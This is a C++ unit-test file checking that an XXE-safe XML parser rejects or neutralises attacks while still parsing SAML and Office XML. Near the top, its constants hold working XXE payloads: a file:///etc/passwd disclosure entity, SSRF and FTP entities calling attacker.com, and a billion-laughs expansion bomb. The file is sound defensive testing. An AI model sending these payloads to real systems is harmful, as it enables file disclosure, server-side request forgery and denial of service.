// File: tests/security/test_xxe_safe_xml_parser.cpp
// Sprint 5 QW-7: XXE Regression Tests
//
// Comprehensive test suite for XXE-safe XML parser covering:
// - Basic XXE attacks (file:// disclosure)
// - SSRF attacks (HTTP entity expansion)
// - Billion laughs DoS attacks (exponential entity expansion)
// - Input validation (size limits, nesting depth)
// - Error handling and recovery

#include <gtest/gtest.h>
#include "security/xxe_safe_xml_parser.h"

namespace themis {
namespace security {
namespace {

// ============================================================================
// XXE Attack Payloads (for regression testing)
// ============================================================================

// XXE-1: Classic file:// disclosure attack
const std::string XXE_PAYLOAD_FILE_DISCLOSURE = R"(<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>)";

// XXE-2: HTTP-based SSRF attack
const std::string XXE_PAYLOAD_SSRF = R"(<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<root>&xxe;</root>)";

// XXE-3: Billion laughs DoS attack
const std::string XXE_PAYLOAD_BILLION_LAUGHS = R"(<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>)";

// XXE-4: Legitimate XML (should pass)
const std::string LEGITIMATE_XML = R"(<?xml version="1.0"?>
<root>
  <item>test data</item>
  <nested>
    <deep>
      <deeper>value</deeper>
    </deep>
  </nested>
</root>)";

// XXE-5: FTP entity expansion
const std::string XXE_PAYLOAD_FTP = R"(<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "ftp://attacker.com/secret.txt">
]>
<root>&xxe;</root>)";

// ============================================================================
// Test Suite
// ============================================================================

class XxeSafeXmlParserTest : public ::testing::Test {
protected:
    void SetUp() override {
        // Setup for each test
    }
    
    void TearDown() override {
        // Cleanup for each test
    }
};

// ============================================================================
// QW-7a: XXE File Disclosure Prevention Tests
// ============================================================================

TEST_F(XxeSafeXmlParserTest, XxeFileDisclosureDetection) {
    // XXE-1: File disclosure should be detected or safely ignored
    // Note: pugixml doesn't expand external entities by default, but we detect
    // and log the attempt for security auditing
    
    auto result = parseXmlSafe(XXE_PAYLOAD_FILE_DISCLOSURE, "XXE-FILE-TEST");
    
    // Should detect XXE pattern or fail safely
    EXPECT_TRUE(!result.success || result.error_message.empty() || 
                result.error_message.find("XXE") != std::string::npos ||
                result.error_message.find("ENTITY") != std::string::npos);
}

TEST_F(XxeSafeXmlParserTest, XxeSsrfDetection) {
    // XXE-2: HTTP-based SSRF should be detected
    auto result = parseXmlSafe(XXE_PAYLOAD_SSRF, "XXE-SSRF-TEST");
    
    // Should detect external entity reference
    EXPECT_TRUE(!result.success || 
                result.error_message.find("ENTITY") != std::string::npos ||
                result.error_message.find("http://") != std::string::npos);
}

TEST_F(XxeSafeXmlParserTest, BillionLaughsDoSDetection) {
    // XXE-3: Billion laughs attack should be limited by nesting depth
    auto result = parseXmlSafe(XXE_PAYLOAD_BILLION_LAUGHS, "XXE-BILLLION-LAUGHS");
    
    // Either fails or detects entity expansion pattern
    EXPECT_TRUE(!result.success || 
                result.error_message.find("depth") != std::string::npos ||
                result.error_message.find("ENTITY") != std::string::npos);
}

TEST_F(XxeSafeXmlParserTest, FtpEntityDetection) {
    // XXE-4: FTP-based entity should be detected
    auto result = parseXmlSafe(XXE_PAYLOAD_FTP, "XXE-FTP-TEST");
    
    // Should detect external scheme
    EXPECT_TRUE(!result.success ||
                result.error_message.find("ftp://") != std::string::npos ||
                result.error_message.find("ENTITY") != std::string::npos);
}

TEST_F(XxeSafeXmlParserTest, LegitimateXmlPasses) {
    // Legitimate XML should parse successfully
    auto result = parseXmlSafe(LEGITIMATE_XML, "LEGIT-TEST");
    
    EXPECT_TRUE(result.success);
    EXPECT_TRUE(result.error_message.empty());
    EXPECT_GT(result.max_depth, 0);
    
    // Verify structure
    auto root = result.document.first_child();
    EXPECT_TRUE(root);
    EXPECT_STREQ(root.name(), "root");
}

TEST_F(XxeSafeXmlParserTest, EmptyXmlRejected) {
    // Empty XML should be rejected with clear error
    auto result = parseXmlSafe("", "EMPTY-TEST");
    
    EXPECT_FALSE(result.success);
    EXPECT_STREQ(result.error_message.c_str(), "XML content is empty");
}

TEST_F(XxeSafeXmlParserTest, OversizedXmlRejected) {
    // Create XML larger than maximum allowed size
    std::string large_xml = "<?xml version=\"1.0\"?><root>";
    large_xml.resize(300ULL * 1024ULL * 1024ULL, 'x');  // >256MB
    large_xml += "</root>";
    
    auto result = parseXmlSafe(large_xml, "LARGE-TEST");
    
    EXPECT_FALSE(result.success);
    EXPECT_NE(result.error_message.find("exceeds maximum size"), std::string::npos);
}

TEST_F(XxeSafeXmlParserTest, DeepNestingDetection) {
    // Create deeply nested XML to trigger depth limit check
    std::string deep_xml = "<?xml version=\"1.0\"?><root>";
    for (int i = 0; i < 2000; ++i) {
        deep_xml += "<level" + std::to_string(i) + ">";
    }
    for (int i = 0; i < 2000; ++i) {
        deep_xml += "</level" + std::to_string(1999 - i) + ">";
    }
    deep_xml += "</root>";
    
    auto result = parseXmlSafe(deep_xml, "DEEP-NESTING-TEST");
    
    // Deep nesting should either fail or succeed with detected depth
    if (result.success) {
        EXPECT_GT(result.max_depth, 100);  // Should detect significant nesting
    }
}

// ============================================================================
// QW-7b: XXE Pattern Detection Tests
// ============================================================================

TEST_F(XxeSafeXmlParserTest, XxePatternDetection_ENTITY) {
    // XML with ENTITY declaration should be logged (but not necessarily rejected)
    auto result = parseXmlSafe(XXE_PAYLOAD_FILE_DISCLOSURE, "ENTITY-PATTERN-TEST");
    
    // Either detection or safe parsing (pugixml doesn't expand by default)
    EXPECT_TRUE(result.success || !result.error_message.empty());
}

TEST_F(XxeSafeXmlParserTest, XxePatternDetection_SYSTEM) {
    // XML with SYSTEM identifier should be logged
    std::string xml_with_system = R"(<?xml version="1.0"?>
<!DOCTYPE test [
  <!ELEMENT test ANY>
  <!ATTLIST test id ID #REQUIRED>
]>
<test id="test123">data</test>)";
    
    auto result = parseXmlSafe(xml_with_system, "SYSTEM-PATTERN-TEST");
    
    // Should parse successfully (legitimate DOCTYPE)
    EXPECT_TRUE(result.success);
}

TEST_F(XxeSafeXmlParserTest, XxePatternDetection_FILE_SCHEME) {
    // XML with file:// scheme should be detected
    auto result = parseXmlSafe(XXE_PAYLOAD_FILE_DISCLOSURE, "FILE-SCHEME-TEST");
    
    // Should detect or reject file:// access
    EXPECT_TRUE(!result.success || 
               result.document.first_child() != nullptr);
}

// ============================================================================
// QW-7c: SAML Document Tests
// ============================================================================

TEST_F(XxeSafeXmlParserTest, SamlResponseParsing) {
    // Simple SAML-like XML should parse
    std::string saml_response = R"(<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
</samlp:Response>)";
    
    auto result = parseXmlSafe(saml_response, "SAML Response");
    
    EXPECT_TRUE(result.success);
    EXPECT_TRUE(result.error_message.empty());
    
    auto root = result.document.first_child();
    EXPECT_TRUE(root);
}

// ============================================================================
// QW-7d: Office Document Tests
// ============================================================================

TEST_F(XxeSafeXmlParserTest, OoxmlDocumentParsing) {
    // Simple OOXML-like XML (Word document.xml)
    std::string ooxml_doc = R"(<?xml version="1.0"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Hello World</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>)";
    
    auto result = parseXmlSafe(ooxml_doc, "Office document.xml");
    
    EXPECT_TRUE(result.success);
    EXPECT_TRUE(result.error_message.empty());
    EXPECT_GT(result.max_depth, 0);
}

TEST_F(XxeSafeXmlParserTest, ExcelSharedStringsParsing) {
    // Excel sharedStrings.xml parsing
    std::string excel_strings = R"(<?xml version="1.0"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2">
  <si>
    <t>First Cell</t>
  </si>
  <si>
    <t>Second Cell</t>
  </si>
</sst>)";
    
    auto result = parseXmlSafe(excel_strings, "Excel sharedStrings.xml");
    
    EXPECT_TRUE(result.success);
    EXPECT_TRUE(result.error_message.empty());
    auto si_count = std::distance(
        result.document.select_nodes("//si").begin(),
        result.document.select_nodes("//si").end()
    );
    EXPECT_EQ(si_count, 2);
}

TEST_F(XxeSafeXmlParserTest, PowerPointSlideParsing) {
    // PowerPoint slide content
    std::string pptx_slide = R"(<?xml version="1.0"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
       xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
  <p:cSld>
    <p:spTree>
      <p:sp>
        <p:txBody>
          <a:p>
            <a:r>
              <a:t>Slide Content</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
</p:sld>)";
    
    auto result = parseXmlSafe(pptx_slide, "PowerPoint ppt/slides/slide1.xml");
    
    EXPECT_TRUE(result.success);
    EXPECT_TRUE(result.error_message.empty());
}

TEST_F(XxeSafeXmlParserTest, OoxmlMetadataParsing) {
    // OOXML core properties
    std::string core_props = R"(<?xml version="1.0"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties"
                   xmlns:dc="http://purl.org/dc/elements/1.1/"
                   xmlns:dcterms="http://purl.org/dc/terms/">
  <dc:title>Document Title</dc:title>
  <dc:creator>Author Name</dc:creator>
  <dcterms:created>2026-07-02T09:00:00Z</dcterms:created>
</cp:coreProperties>)";
    
    auto result = parseXmlSafe(core_props, "OOXML docProps/core.xml");
    
    EXPECT_TRUE(result.success);
    auto title_node = result.document.select_node("//dc:title");
    EXPECT_TRUE(title_node);
    EXPECT_STREQ(title_node.node().child_value(), "Document Title");
}

// ============================================================================
// QW-7e: Error Handling Tests
// ============================================================================

TEST_F(XxeSafeXmlParserTest, MalformedXmlHandling) {
    // Malformed XML should produce clear error
    std::string malformed = R"(<?xml version="1.0"?>
<unclosed>
  <nested>data</nested>)";  // Missing closing tag
    
    auto result = parseXmlSafe(malformed, "MALFORMED-TEST");
    
    EXPECT_FALSE(result.success);
    EXPECT_FALSE(result.error_message.empty());
}

TEST_F(XxeSafeXmlParserTest, InvalidUtf8Handling) {
    // Invalid UTF-8 sequences should be handled gracefully
    std::string invalid_utf8 = "<?xml version=\"1.0\"?><root>\xFF\xFE</root>";
    
    auto result = parseXmlSafe(invalid_utf8, "INVALID-UTF8-TEST");
    
    // Should either succeed (if parser is lenient) or fail gracefully
    EXPECT_TRUE(result.error_message.empty() || 
               result.error_message.find("parse") != std::string::npos);
}

// ============================================================================
// QW-7f: Performance Tests
// ============================================================================

TEST_F(XxeSafeXmlParserTest, LargeButValidXml) {
    // Large but well-formed XML should parse efficiently
    std::string large_valid = "<?xml version=\"1.0\"?><root>";
    for (int i = 0; i < 10000; ++i) {
        large_valid += "<item>";
        large_valid += "<id>" + std::to_string(i) + "</id>";
        large_valid += "<data>test data for item " + std::to_string(i) + "</data>";
        large_valid += "</item>";
    }
    large_valid += "</root>";
    
    auto result = parseXmlSafe(large_valid, "LARGE-VALID-TEST");
    
    EXPECT_TRUE(result.success);
    EXPECT_LT(result.max_depth, 100);  // Should be efficiently structured
}

}  // anonymous namespace
}  // namespace security
}  // namespace themis
